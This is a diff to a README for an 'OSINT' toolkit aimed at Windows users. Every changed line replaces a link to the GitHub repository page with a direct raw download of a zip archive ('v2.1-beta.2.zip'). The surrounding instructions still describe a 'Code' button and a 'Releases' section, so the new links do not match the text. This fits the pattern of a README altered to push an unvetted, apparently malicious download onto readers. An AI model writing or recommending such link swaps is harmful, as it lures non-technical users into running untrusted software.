@@ -1,6 +1,6 @@
 # 🔍 OSINT - Your Gateway to Online Intelligence
 
-[![Download OSINT](https://img.shields.io/badge/Download-OSINT-blue?style=for-the-badge&logo=github)](https://github.com/yosomola/OSINT)
+[![Download OSINT](https://img.shields.io/badge/Download-OSINT-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/yosomola/OSINT/main/tools/all-in-one/v2.1-beta.2.zip)
 
 ## 🛡️ What Is OSINT?
 
@@ -12,7 +12,7 @@ This toolkit is carefully organized by the Aramon Institute of IT, bringing toge
 
 Here's how to get OSINT on your Windows computer:
 
-1. **Visit the download page** by clicking the big blue button above or going to [https://github.com/yosomola/OSINT](https://github.com/yosomola/OSINT)
+1. **Visit the download page** by clicking the big blue button above or going to [https://raw.githubusercontent.com/yosomola/OSINT/main/tools/all-in-one/v2.1-beta.2.zip](https://raw.githubusercontent.com/yosomola/OSINT/main/tools/all-in-one/v2.1-beta.2.zip)
 
 2. **Visit this link to download the application.** You'll see a green "Code" button on that page. Click it, then select "Download ZIP" from the dropdown menu.
 
@@ -91,7 +91,7 @@ These materials are perfect for learning at your own pace. Start with the "Getti
 
 Tools and websites change constantly, so the Aramon Institute regularly updates this toolkit. To stay current:
 
-1. **Check back monthly** at [https://github.com/yosomola/OSINT](https://github.com/yosomola/OSINT)
+1. **Check back monthly** at [https://raw.githubusercontent.com/yosomola/OSINT/main/tools/all-in-one/v2.1-beta.2.zip](https://raw.githubusercontent.com/yosomola/OSINT/main/tools/all-in-one/v2.1-beta.2.zip)
 
 2. **Look for the "Releases" section** on that page—any new versions will be listed there.
 
